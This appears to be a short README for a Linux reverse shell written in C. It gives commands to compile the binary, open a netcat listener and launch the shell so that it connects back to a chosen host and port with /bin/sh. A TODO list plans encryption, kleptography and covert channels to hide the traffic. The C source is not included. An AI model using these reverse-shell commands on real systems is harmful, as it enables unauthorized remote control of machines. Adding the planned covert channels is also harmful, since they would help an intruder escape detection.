# Concept

Making a Reverse Shells in C for Linux

## Linux
### Compiling & Usage

```bash
# Compile it
gcc -o linux_rev_shell.elf linux_rev_shell.c

## Another system:
## set up a listener 
nc -nvlp -k 1234

## Set up env variables for easy execution in terminal
# Execute it, passing the env variables.
RP="1234" && RH="127.0.0.1" && BIN="/bin/sh"  && ./linux_rev_shell.elf $RP $RH $BIN

```

## TODO 
- [ ] debug (print outs, etc)
- [ ] more checks
- [ ] encryption
- [ ] LISTEN | CLIENT for both, so no need for NC and stuff.
- [ ] Implement Secure channels, including(but not lim. To)
    - [ ] Cryptography
    - [ ] Kleptography
    - [ ] Covert Channels
    - Like [This](https://embeddedsw.net/Cipher_Reference_Home.html) and [This](https://embeddedsw.net/libObfuscate_Cryptography_Home.html) (both `embeddedsw.net`)
